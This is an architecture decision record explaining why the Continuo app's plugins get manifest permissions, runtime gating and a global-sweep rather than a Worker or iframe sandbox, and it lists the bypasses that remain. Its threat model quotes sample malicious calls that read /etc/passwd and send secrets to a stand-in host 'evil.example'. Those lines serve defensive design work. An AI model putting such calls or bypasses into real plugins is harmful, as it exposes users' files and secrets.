# ADR-Plugin-1 · No WebWorker/iframe sandbox; trust = manifest + permissions + sweep

**Status**: Accepted (extracted from ContinuoWiki tutorial 08 §3.1, tutorial 10 §3.5).

## Context

Plugins in Continuo are arbitrary JS loaded from `${userData}/plugins/<id>/main.js`. They run in the renderer's realm and share `window` / `globalThis` with the Continuo UI. By default a malicious or buggy plugin could call `window.api.fs.readFile('/etc/passwd')` or `globalThis.fetch('https://evil.example/leak', { body: secrets })`.

The textbook answer is "sandbox them in a Web Worker or iframe." But: `registerPanel(factory)` returning a `ReactNode`, `registerEvent(cb)` subscribing to a global event bus, and `addCommand({ fn })` running synchronously — none of these survive a realm boundary without complete redesign. A real sandbox means rewriting the plugin API (and its 199 BDD tests) from scratch.

Three options were evaluated (tutorial 10 §3.5):

| Option | Implementation | Strength | Cost |
|---|---|---|---|
| A · Convention only | SDK + docs, no runtime check | Weak (plugin can bypass with one line) | Low; dishonest |
| **B · Wrap + entry-sweep** | Load-time delete of globals + scoped facade + runtime gating | Medium (escapable but meaningful) | Medium |
| C · True isolation | Worker / iframe | Strong | High (full API redesign) |

## Decision

Choose **option B**. Specifically:

1. **Manifest declares intent** — `permissions: PermissionKey[]` in `manifest.json`. Unknown keys → schema rejection.
2. **User approves at first activation** — `PermissionPrompt` modal. Partial grants supported.
3. **Runtime gating** — every `app.fs.*` / `app.network.fetch` / `app.clipboard.*` / `app.shell.exec` call checks the granted set. Unauthorized call throws `PermissionError`.
4. **Entry sweep (`sandbox-sweep.ts`)** — in production builds, removes `globalThis.fetch`, `navigator.clipboard`, and the original `window.__lmApi` shape from plugin scope so the obvious bypass paths fail with a clear `TypeError`.
5. **Reserve option C** — Worker/iframe isolation is a v6+ candidate. The known residual (`window.__lmApi` is `contextBridge`-exposed and non-configurable, so genuinely undeletable from the renderer realm) means a determined attacker can still escape; that's an explicit-malice case marketplace review is expected to catch.

## Why not C now

- Cost = redo the entire plugin SDK + its 199 BDD tests.
- Marginal safety improvement against the realistic threat model (third-party plugin author bug, not nation-state attacker) is small.
- Industry precedent: Obsidian, VSCode marketplaces are not true sandboxes either — they rely on review.

The decision is **honest**: "we did what was achievable for the engineering budget and are clear about what we didn't catch."

## Known residuals

- `window.__lmApi.fs.*` still works (contextBridge non-configurable). Treated as explicit-malice → marketplace review.
- `<iframe>` / `Worker` / `eval` inside a plugin share globals — same realm. Future option C territory.

## See also

- ContinuoWiki tutorial 10 §3.5–§3.7 (full rationale)
- `src/plugins/sandbox-sweep.ts`
- `src/plugins/scoped-app.ts` (runtime gating)
- `src/plugins/permissions.ts` (`ensureAuthorized`)
- ADR-Plugin-3 (`CoApp` not `window.api`)
